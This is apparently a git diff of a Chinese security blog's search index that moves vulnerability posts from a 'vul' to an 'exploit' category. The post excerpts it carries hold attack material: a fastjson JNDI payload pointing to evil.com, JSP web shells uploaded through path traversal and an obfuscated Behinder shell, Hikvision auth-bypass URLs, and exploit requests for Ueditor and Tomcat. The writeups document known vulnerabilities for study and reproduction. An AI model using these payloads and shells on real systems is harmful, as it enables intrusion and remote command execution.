@@ -72,27 +72,27 @@ var store = [{
         "teaser": null
       },{
         "title": "Redis未授权访问实战",
-        "excerpt":"Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。 0x01 Redis简介 简单来说，Redis是一种数据库。 Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 Redis和mysql的区别： https://www.hzpady.com/a/2119.html 0x02 漏洞原理（产生条件） redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证，可以免密码登入redis服务。 0x03 漏洞利用 方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限） 先下载个Redis 在redis官网上看到可以docker pull，那岂不乐哉。 $ docker search redis $ docker pull redis 只需两条命令，redis已成为我的囊中之物 接下来运行容器 $ docker run -d -p 6379:6379 --name redis redis 用ps命令可以看到redis已经部署到了我的6379端口了 刚刚学了Redis未授权访问漏洞，那我自己不会也可以被x了吧？于是我扫了一下自己，并没有发现6379端口开放，那我应该还是安全的。而且好像如果被x了，x的应该也是我的docker容器才对！ 下一步进入容器 $ docker...","categories": ["vul"],
+        "excerpt":"Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。 0x01 Redis简介 简单来说，Redis是一种数据库。 Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 Redis和mysql的区别： https://www.hzpady.com/a/2119.html 0x02 漏洞原理（产生条件） redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证，可以免密码登入redis服务。 0x03 漏洞利用 方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限） 先下载个Redis 在redis官网上看到可以docker pull，那岂不乐哉。 $ docker search redis $ docker pull redis 只需两条命令，redis已成为我的囊中之物 接下来运行容器 $ docker run -d -p 6379:6379 --name redis redis 用ps命令可以看到redis已经部署到了我的6379端口了 刚刚学了Redis未授权访问漏洞，那我自己不会也可以被x了吧？于是我扫了一下自己，并没有发现6379端口开放，那我应该还是安全的。而且好像如果被x了，x的应该也是我的docker容器才对！ 下一步进入容器 $ docker...","categories": ["exploit"],
         "tags": ["redis","unauthorized","linux","ssh"],
-        "url": "/vul/Redis/",
+        "url": "/exploit/Redis/",
         "teaser": null
       },{
         "title": "CVE-2016-4437 - Shiro反序列化",
-        "excerpt":"CVE-2016-4437 - Shiro反序列化  0x00 漏洞概述  Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。   0x01 影响范围   Apache Shiro &lt;=1.2.4   0x02 环境搭建  使用vulhub搭建环境  $ docker-compose up -d     0x03 漏洞原理  Shiro的身份认证工作流程：   通过前端传入的值–&gt;获取remenberMe cookie–&gt;base64加密–&gt;AES加密–&gt;反序列化   以上流程中AES加密的密钥存在padding oracle攻击及密钥泄露。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞   0x04 漏洞检测   尝试登录，登录的返回包中有rememberMe=deleteMe字段      或者不登录，发送一个GET请求登录页面的包，把cookie改成rememberMe=1，返回包中也存在rememberMe=deleteMe字段      则可判断使用了shiro框架，接下来使用工具ShiroExploit 检测是否存在shiro反序列化漏洞   https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51      当命令框可输入，代表存在漏洞      可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell      ","categories": ["vul"],
+        "excerpt":"CVE-2016-4437 - Shiro反序列化  0x00 漏洞概述  Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。   0x01 影响范围   Apache Shiro &lt;=1.2.4   0x02 环境搭建  使用vulhub搭建环境  $ docker-compose up -d     0x03 漏洞原理  Shiro的身份认证工作流程：   通过前端传入的值–&gt;获取remenberMe cookie–&gt;base64加密–&gt;AES加密–&gt;反序列化   以上流程中AES加密的密钥存在padding oracle攻击及密钥泄露。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞   0x04 漏洞检测   尝试登录，登录的返回包中有rememberMe=deleteMe字段      或者不登录，发送一个GET请求登录页面的包，把cookie改成rememberMe=1，返回包中也存在rememberMe=deleteMe字段      则可判断使用了shiro框架，接下来使用工具ShiroExploit 检测是否存在shiro反序列化漏洞   https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51      当命令框可输入，代表存在漏洞      可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell      ","categories": ["exploit"],
         "tags": ["shiro","unserialize","web","rce"],
-        "url": "/vul/CVE-2016-4437/",
+        "url": "/exploit/CVE-2016-4437/",
         "teaser": null
       },{
         "title": "MS17-010 - 永恒之蓝",
-        "excerpt":"MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 0x01 影响版本 WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0 0x02 环境搭建 靶机winXP（关闭防火墙） 192.168.32.131 攻击机kali 192.168.32.128 0x03 漏洞检测 通过nmap的扫描可以看到445端口是开着的，永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞 打开msf，搜索ms17-010 选中auxiliary/scanner/smb/smb_ms17_010这个模块，扫描C断存在漏洞的主机 用到的命令： $ msfconsole $ search ms17-101 $ use 1 $ show options $ set rhost 192.168.32.0/24 $ run 结果显示靶机存在漏洞...","categories": ["vul"],
+        "excerpt":"MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 0x01 影响版本 WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0 0x02 环境搭建 靶机winXP（关闭防火墙） 192.168.32.131 攻击机kali 192.168.32.128 0x03 漏洞检测 通过nmap的扫描可以看到445端口是开着的，永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞 打开msf，搜索ms17-010 选中auxiliary/scanner/smb/smb_ms17_010这个模块，扫描C断存在漏洞的主机 用到的命令： $ msfconsole $ search ms17-101 $ use 1 $ show options $ set rhost 192.168.32.0/24 $ run 结果显示靶机存在漏洞...","categories": ["exploit"],
         "tags": ["windows","smb","msf","rce"],
-        "url": "/vul/ms17-010/",
+        "url": "/exploit/ms17-010/",
         "teaser": null
       },{
         "title": "CVE-2017-7921 - Hikvision摄像头越权访问",
-        "excerpt":"body=”laCurrentLanguage” &amp;&amp; country=”CN” 查看用户列表 /Security/users?auth=YWRtaW46MTEK 获取监控快照 /onvif-http/snapshot?auth=YWRtaW46MTEK 下载配置文件 /System/configurationFile?auth=YWRtaW46MTEK 解码配置文件 https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor 安装脚本依赖文件 sudo python3 -m pip install pycryptodome 解码，可得到用户名和密码 ./decrypt_configurationFile.py &lt;nameofdownloadedconfig&gt; CVE-2021-36260-HikvisionRCE: # Exploit Title: Hikvision Web Server Build 210702 - Command Injection # Exploit Author: bashis # Vendor Homepage: https://www.hikvision.com/ # Version: 1.0 # CVE: CVE-2021-36260 # Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html...","categories": ["vul"],
+        "excerpt":"body=”laCurrentLanguage” &amp;&amp; country=”CN” 查看用户列表 /Security/users?auth=YWRtaW46MTEK 获取监控快照 /onvif-http/snapshot?auth=YWRtaW46MTEK 下载配置文件 /System/configurationFile?auth=YWRtaW46MTEK 解码配置文件 https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor 安装脚本依赖文件 sudo python3 -m pip install pycryptodome 解码，可得到用户名和密码 ./decrypt_configurationFile.py &lt;nameofdownloadedconfig&gt; CVE-2021-36260-HikvisionRCE: # Exploit Title: Hikvision Web Server Build 210702 - Command Injection # Exploit Author: bashis # Vendor Homepage: https://www.hikvision.com/ # Version: 1.0 # CVE: CVE-2021-36260 # Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html...","categories": ["exploit"],
         "tags": ["hikvision","unserialize","web"],
-        "url": "/vul/CVE-2017-7921/",
+        "url": "/exploit/CVE-2017-7921/",
         "teaser": null
       },{
         "title": "SQL注入Getshell的几种方式",
@@ -102,15 +102,15 @@ var store = [{
         "teaser": null
       },{
         "title": "CVE-2017-12615 - Tomcat任意文件写入",
-        "excerpt":"CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境 查看配置文件conf/web.xml中readonly的设置 漏洞复现 访问主页，抓包后修改数据包 可通过 PUT 方式创建一个 JSP 文件。虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过了限制。 改完包的时候不知道为啥上传失败了，于是我换了buuoj的环境，上传冰蝎的jsp木马，返回201代表上传成功 再用冰蝎连接即可 Windows服务器上搭建的tomcat可以在文件尾部加上 %20或者 ::$DATA等绕过 POC &amp;&amp; EXP #CVE-2017-12615 POC import requests import optparse import os parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') parse.add_option('-f',dest='FILE',help='target list') options,args =...","categories": ["vul"],
+        "excerpt":"CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境 查看配置文件conf/web.xml中readonly的设置 漏洞复现 访问主页，抓包后修改数据包 可通过 PUT 方式创建一个 JSP 文件。虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过了限制。 改完包的时候不知道为啥上传失败了，于是我换了buuoj的环境，上传冰蝎的jsp木马，返回201代表上传成功 再用冰蝎连接即可 Windows服务器上搭建的tomcat可以在文件尾部加上 %20或者 ::$DATA等绕过 POC &amp;&amp; EXP #CVE-2017-12615 POC import requests import optparse import os parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') parse.add_option('-f',dest='FILE',help='target list') options,args =...","categories": ["exploit"],
         "tags": ["tomcat","web"],
-        "url": "/vul/CVE-2017-12615/",
+        "url": "/exploit/CVE-2017-12615/",
         "teaser": null
       },{
         "title": "CVE-2020-1938 - Ghostcat",
-        "excerpt":"CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat 是由长亭发现的存在于 Tomcat 中的漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 0x01 影响范围 Tomcat 9.x &lt; 9.0.31 Tomcat 8.x &lt; 8.5.51 Tomcat 7.x &lt; 7.0.100 Tomcat 6.x 0x02 环境搭建（vulhub） 0x03 漏洞检测...","categories": ["vul"],
+        "excerpt":"CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat 是由长亭发现的存在于 Tomcat 中的漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 0x01 影响范围 Tomcat 9.x &lt; 9.0.31 Tomcat 8.x &lt; 8.5.51 Tomcat 7.x &lt; 7.0.100 Tomcat 6.x 0x02 环境搭建（vulhub） 0x03 漏洞检测...","categories": ["exploit"],
         "tags": ["tomcat","web","ajp","lfi"],
-        "url": "/vul/CVE-2020-1938/",
+        "url": "/exploit/CVE-2020-1938/",
         "teaser": null
       },{
         "title": "HackTheBox - Holiday",
@@ -150,32 +150,32 @@ var store = [{
         "teaser": null
       },{
         "title": "帆软V8文件上传漏洞",
-        "excerpt":"遇到的一个帆软V8文件上传漏洞，url得加上/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin才能正常访问，不然是空白页 弱口令admin/admin 进去之后长这样 启动水滴工具，访问本地43023端口，用这个模块上传冰蝎jsp免杀马 &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.*, sun.misc.BASE64Encoder,javax.crypto.spec.SecretKeySpec\" %&gt; &lt;%@ page import=\"java.io.BufferedReader\" %&gt; &lt;%@ page import=\"java.io.IOException\" %&gt; &lt;%@ page import=\"java.lang.reflect.Method\" %&gt; &lt;jsp:scriptlet&gt; String pp =\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022; &lt;/jsp:scriptlet&gt; &lt;% class b6 extends \\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072{} b6 b6 = new b6(); %&gt; &lt;%! public byte[] gg(byte[] a1,String k) { try { javax.crypto./*123*/Cipher c = javax.crypto.Cipher.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063e(\"AES/ECB/PKCS5Padding\"); c.init(javax.crypto.Cipher.DECRYPT_MODE,...","categories": ["vul"],
+        "excerpt":"遇到的一个帆软V8文件上传漏洞，url得加上/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin才能正常访问，不然是空白页 弱口令admin/admin 进去之后长这样 启动水滴工具，访问本地43023端口，用这个模块上传冰蝎jsp免杀马 &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.*, sun.misc.BASE64Encoder,javax.crypto.spec.SecretKeySpec\" %&gt; &lt;%@ page import=\"java.io.BufferedReader\" %&gt; &lt;%@ page import=\"java.io.IOException\" %&gt; &lt;%@ page import=\"java.lang.reflect.Method\" %&gt; &lt;jsp:scriptlet&gt; String pp =\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022; &lt;/jsp:scriptlet&gt; &lt;% class b6 extends \\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072{} b6 b6 = new b6(); %&gt; &lt;%! public byte[] gg(byte[] a1,String k) { try { javax.crypto./*123*/Cipher c = javax.crypto.Cipher.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063e(\"AES/ECB/PKCS5Padding\"); c.init(javax.crypto.Cipher.DECRYPT_MODE,...","categories": ["exploit"],
         "tags": ["finereport","nday","web"],
-        "url": "/vul/finereport/",
+        "url": "/exploit/finereport/",
         "teaser": null
       },{
         "title": "Ueditor任意文件上传漏洞",
-        "excerpt":"Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。 0x01 POC 访问/ueditor/net/controller.ashx 控制器文件，当出现下图的时候表示编辑器成功运行，且漏洞存在。 但也不一定，比如上图的路径为/scripts/ueditor/net/controller.ashx 0x02 漏洞利用 现在vps上起一个http服务上面挂着一张jpg格式的aspx免杀马 Expoliet: POST /vul_ip/UEditor/net/controller.ashx?action=catchimage HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Connection: close...","categories": ["vul"],
+        "excerpt":"Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。 0x01 POC 访问/ueditor/net/controller.ashx 控制器文件，当出现下图的时候表示编辑器成功运行，且漏洞存在。 但也不一定，比如上图的路径为/scripts/ueditor/net/controller.ashx 0x02 漏洞利用 现在vps上起一个http服务上面挂着一张jpg格式的aspx免杀马 Expoliet: POST /vul_ip/UEditor/net/controller.ashx?action=catchimage HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Connection: close...","categories": ["exploit"],
         "tags": ["ueditor","nday","web"],
-        "url": "/vul/ueditor/",
+        "url": "/exploit/ueditor/",
         "teaser": null
       },{
         "title": "CVE-2021-29441 - Nacos身份认证绕过漏洞",
-        "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台     ","categories": ["vul"],
+        "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台     ","categories": ["exploit"],
         "tags": ["nacos","nday","web","unserialize"],
-        "url": "/vul/nacos/",
+        "url": "/exploit/nacos/",
         "teaser": null
       },{
         "title": "Hikvision综合安防管理平台文件上传",
-        "excerpt":"想要成为红队大佬，复现漏洞少不了 fofa查询语句：icon_hash=\"-808437027\" &amp;&amp; app=\"HIKVISION-iSecure-Center\" 如果凭拼接/center/api/files;.js后如下图响应，则漏洞很大可能存在 上传木马 POST /center/api/files;.js HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 539 Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4 --e54e7e5834c8c50e92189959fe7227a4 Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp\" Content-Type: application/octet-stream &lt;% if(\"yueyejian\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1){ out.println(new String(b)); }...","categories": ["vul"],
+        "excerpt":"想要成为红队大佬，复现漏洞少不了 fofa查询语句：icon_hash=\"-808437027\" &amp;&amp; app=\"HIKVISION-iSecure-Center\" 如果凭拼接/center/api/files;.js后如下图响应，则漏洞很大可能存在 上传木马 POST /center/api/files;.js HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 539 Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4 --e54e7e5834c8c50e92189959fe7227a4 Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp\" Content-Type: application/octet-stream &lt;% if(\"yueyejian\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1){ out.println(new String(b)); }...","categories": ["exploit"],
         "tags": ["hikvision","nday","web"],
-        "url": "/vul/hikvision/",
+        "url": "/exploit/hikvision/",
         "teaser": null
       },{
         "title": "fastjson-1.2.24-RCE",
-        "excerpt":"Fastjson-1.2.24-RCE 0x00 漏洞概述 fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是jndi注入。很快阿里发布了新的版本1.2.25，通过checkAutoType()这个函数来防御这个漏洞。 后来针对checkAutoType()这个函数，出现了一系列的绕过手段以及修复补丁。 0x01 漏洞原理 fastjson RCE关键函数 DefaultJSONParser. parseObject() #解析传入的 json 字符串提取不同的 key 进行后续的处理。 TypeUtils. loadClass() #根据传入的类名，生成类的实例。 JavaBeanDeserializer. Deserialze() #依次调用 @type 中传入类的对象公有 set\\get\\is 方法。 ParserConfig. checkAutoType() #阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。 Payload { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://evil.com:9999/\", \"autoCommit\":true } } 该Payload有效的原理是：fastjson 在处理以@type形式传入的类的时候，会默认调用该类的共有 set\\get\\is 函数，因此我们在寻找利用类的时候思路如下： 1、类的成员变量我们可以控制； 2、想办法在调用类的某个set\\get\\is函数的时候造成命令执行。 于是便找到了 JdbcRowSetImpl 类，该类在 setAutoCommit 函数中会对成员变量...","categories": ["vul"],
+        "excerpt":"Fastjson-1.2.24-RCE 0x00 漏洞概述 fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是jndi注入。很快阿里发布了新的版本1.2.25，通过checkAutoType()这个函数来防御这个漏洞。 后来针对checkAutoType()这个函数，出现了一系列的绕过手段以及修复补丁。 0x01 漏洞原理 fastjson RCE关键函数 DefaultJSONParser. parseObject() #解析传入的 json 字符串提取不同的 key 进行后续的处理。 TypeUtils. loadClass() #根据传入的类名，生成类的实例。 JavaBeanDeserializer. Deserialze() #依次调用 @type 中传入类的对象公有 set\\get\\is 方法。 ParserConfig. checkAutoType() #阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。 Payload { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://evil.com:9999/\", \"autoCommit\":true } } 该Payload有效的原理是：fastjson 在处理以@type形式传入的类的时候，会默认调用该类的共有 set\\get\\is 函数，因此我们在寻找利用类的时候思路如下： 1、类的成员变量我们可以控制； 2、想办法在调用类的某个set\\get\\is函数的时候造成命令执行。 于是便找到了 JdbcRowSetImpl 类，该类在 setAutoCommit 函数中会对成员变量...","categories": ["exploit"],
         "tags": ["fastjson","web","java"],
-        "url": "/vul/fastjson/",
+        "url": "/exploit/fastjson/",
         "teaser": null
       }]
